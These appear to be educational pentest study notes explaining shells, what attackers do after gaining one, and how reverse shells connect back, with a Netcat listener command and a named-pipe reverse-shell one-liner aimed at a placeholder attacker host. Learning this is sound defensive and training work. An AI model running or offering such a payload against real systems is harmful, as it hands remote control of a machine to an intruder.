### What is a Shell?

A shell is software that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface, and this will depend on the operating system running on the target system.
## What attackers can do with a shell

🖥️ ==`Remote System Control`== : Run commands or software on the target machine from afar.
 
⬆️ ==`Privilege Escalation`== : Upgrade from limited access (user) to higher access (admin/root).

📤 ==`Data Exfiltration`== : Search for, read, and copy sensitive files or data.

🔁 ==`Persistence`== : 

Maintain access by:  Creating users, Adding credentials ,Installing backdoors

🧪 ==`Post‑Exploitation`== : 

Perform actions after initial access, such as: Deploying malware, Creating hidden accounts ,Deleting logs or data

🌐 ==`Pivoting`== : Use the compromised system as a **launch point** to attack other systems on the same network.

---
# Reverse Shell

A reverse shell, sometimes referred to as a "connect back shell," is one of the most popular techniques for gaining access to a system in cyberattacks. The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.

### ==`How Reverse Shells Work`==
#### **Set up a Netcat (nc) Listener**

As mentioned above, a reverse shell will connect back to the attacker's machine. This machine will be waiting for a connection, so let's use Netcat to listen to a connection using the following command `nc -lvnp 443`.  

```shell-session
attacker@kali:~$ nc -lvnp 443
listening on [any] 4444 ...
```

- `-l`: listen
- `-v`: verbose
- `-n`: no DNS (The `-n` option prevents the connections from using DNS for lookup, so it will not resolve any hostname it will use an IP address)
- `-p`: port
- Common ports (53, 80, 443, etc.) help blend with normal traffic.

As an example, let's analyze an example payload named a **pipe reverse shell**, as shown below.

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```


# Reverse Shell Cheat Sheet
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet